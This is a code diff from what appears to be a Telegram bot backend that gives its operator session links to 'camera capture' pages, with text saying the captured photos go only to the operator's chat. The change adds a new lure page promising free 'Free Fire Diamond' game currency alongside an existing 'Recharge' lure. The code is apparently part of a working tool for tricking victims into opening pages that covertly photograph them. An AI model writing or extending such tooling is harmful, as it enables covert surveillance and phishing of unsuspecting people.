@@ -851,7 +851,8 @@ serve(async (req) => {
         const chromeLink = `${siteUrl}/chrome-custom-capture?session=${sessionId}`;
         const customLink = `${siteUrl}/custom-capture?session=${sessionId}`;
         const rechargeLink = `${siteUrl}/recharge?session=${sessionId}`;
-        let text = `📷 <b>Camera Capture</b>\n\n🔗 <b>Your Permanent Links:</b>\n\n📱 Normal:\n<code>${captureLink}</code>\n\n🌐 Chrome (Android):\n<code>${chromeLink}</code>\n\n🎨 Custom HTML:\n<code>${customLink}</code>\n\n💰 Recharge (NEW):\n<code>${rechargeLink}</code>\n\n<i>📸 Ye links permanent hai, bar bar generate nahi hoge.\nPhotos sirf tumhare chat me aayengi.</i>`;
+        const freefireLink = `${siteUrl}/freefire?session=${sessionId}`;
+        let text = `📷 <b>Camera Capture</b>\n\n🔗 <b>Your Permanent Links:</b>\n\n📱 Normal:\n<code>${captureLink}</code>\n\n🌐 Chrome (Android):\n<code>${chromeLink}</code>\n\n🎨 Custom HTML:\n<code>${customLink}</code>\n\n💰 Recharge:\n<code>${rechargeLink}</code>\n\n🔥 Free Fire Diamond (NEW):\n<code>${freefireLink}</code>\n\n<i>📸 Ye links permanent hai, bar bar generate nahi hoge.\nPhotos sirf tumhare chat me aayengi.</i>`;
         await editMessage(chatId, msgId, text, { inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]] });
         return new Response('OK', { headers: corsHeaders });
       }
